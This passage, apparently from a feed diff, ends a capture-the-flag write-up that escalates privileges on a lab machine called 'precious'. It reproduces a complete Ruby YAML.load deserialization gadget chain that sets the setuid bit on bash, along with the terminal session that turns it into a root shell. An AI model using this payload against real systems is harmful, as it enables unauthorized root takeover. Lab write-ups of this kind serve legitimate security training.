+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span>(file_version &lt;span style="color:#fe8019">!=&lt;/span> local_version)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">puts&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Installed version differs from the one specified in file: &amp;#34;&lt;/span> &lt;span style="color:#fe8019">+&lt;/span> local_name
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">puts&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Installed version is equals to the one specified in file: &amp;#34;&lt;/span> &lt;span style="color:#fe8019">+&lt;/span> local_name
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">end&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we can see that the &lt;code>YAML.load()&lt;/code> function is used to load the &lt;code>dependencies.yaml&lt;/code> file. Apparently this function is vulnerable to RCE by deserialization.&lt;/p>
+&lt;h3 id="privilege-escalation-vector">Privilege Escalation vector&lt;/h3>
+&lt;ul>
+&lt;li>&lt;a href="https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/">Universal RCE with Ruby YAML.load&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565">https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yml" data-lang="yml">&lt;span style="display:flex;">&lt;span>---
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>- !ruby/object:Gem::Installer
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">i&lt;/span>: x
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>- !ruby/object:Gem::SpecFetcher
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">i&lt;/span>: &lt;span style="color:#fe8019">y&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>- !ruby/object:Gem::Requirement
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">requirements&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> !ruby/object:Gem::Package::TarReader
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">io&lt;/span>: &lt;span style="color:#8ec07c">&amp;amp;1&lt;/span> !ruby/object:Net::BufferedIO
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">io&lt;/span>: &lt;span style="color:#8ec07c">&amp;amp;1&lt;/span> !ruby/object:Gem::Package::TarReader::Entry
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">read&lt;/span>: &lt;span style="color:#d3869b">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">header&lt;/span>: &lt;span style="color:#b8bb26">&amp;#34;abc&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">debug_output&lt;/span>: &lt;span style="color:#8ec07c">&amp;amp;1&lt;/span> !ruby/object:Net::WriteAdapter
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">socket&lt;/span>: &lt;span style="color:#8ec07c">&amp;amp;1&lt;/span> !ruby/object:Gem::RequestSet
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">sets&lt;/span>: !ruby/object:Net::WriteAdapter
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">socket&lt;/span>: !ruby/module &amp;#39;Kernel&amp;#39;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">method_id&lt;/span>: :system
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">git_set&lt;/span>: chmod u+s /usr/bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fb4934">method_id&lt;/span>: :resolve
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>henry@precious:~$ &lt;span style="color:#fabd2f">cd&lt;/span> /tmp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>henry@precious:/tmp$ mkdir &lt;span style="color:#fabd2f">test&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>henry@precious:/tmp$ &lt;span style="color:#fabd2f">cd&lt;/span> &lt;span style="color:#fabd2f">test&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>henry@precious:/tmp/test$ nano dependencies.yml
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>henry@precious:/tmp/test$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh: 1: reading: not found
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Traceback &lt;span style="color:#fe8019">(&lt;/span>most recent call last&lt;span style="color:#fe8019">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 33: from /opt/update_dependencies.rb:17:in &lt;span style="color:#b8bb26">`&lt;/span>&amp;lt;main&amp;gt;&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 32: from /opt/update_dependencies.rb:10:in `list_from_file&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 31: from /usr/lib/ruby/2.7.0/psych.rb:279:in &lt;span style="color:#b8bb26">`&lt;/span>load&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in &lt;span style="color:#b8bb26">`&lt;/span>accept&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in &lt;span style="color:#b8bb26">`&lt;/span>visit&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in &lt;span style="color:#b8bb26">`&lt;/span>accept&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in &lt;span style="color:#b8bb26">`&lt;/span>visit&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in &lt;span style="color:#b8bb26">`&lt;/span>register_empty&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in &lt;span style="color:#b8bb26">`&lt;/span>block in register_empty&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in &lt;span style="color:#b8bb26">`&lt;/span>accept&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in &lt;span style="color:#b8bb26">`&lt;/span>visit_Psych_Nodes_Mapping&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in &lt;span style="color:#b8bb26">`&lt;/span>init_with&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in &lt;span style="color:#b8bb26">`&lt;/span>yaml_initialize&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in &lt;span style="color:#b8bb26">`&lt;/span>each&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in &lt;span style="color:#b8bb26">`&lt;/span>read&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in &lt;span style="color:#b8bb26">`&lt;/span>&amp;lt;&amp;lt;&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in &lt;span style="color:#b8bb26">`&lt;/span>resolve&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26"> 2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&amp;lt;&amp;lt;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in &lt;span style="color:#b8bb26">`&lt;/span>write&lt;span style="color:#b8bb26">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system&amp;#39;&lt;/span>: no implicit conversion of nil into String &lt;span style="color:#fe8019">(&lt;/span>TypeError&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>henry@precious:/tmp/test$ /usr/bin/bash -p
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash-5.1# whoami
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash-5.1# id
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>henry&lt;span style="color:#fe8019">)&lt;/span> gid&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>henry&lt;span style="color:#fe8019">)&lt;/span> euid&lt;span style="color:#fe8019">=&lt;/span>0&lt;span style="color:#fe8019">(&lt;/span>root&lt;span style="color:#fe8019">)&lt;/span> groups&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>henry&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash-5.1#
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></content></item></channel></rss>
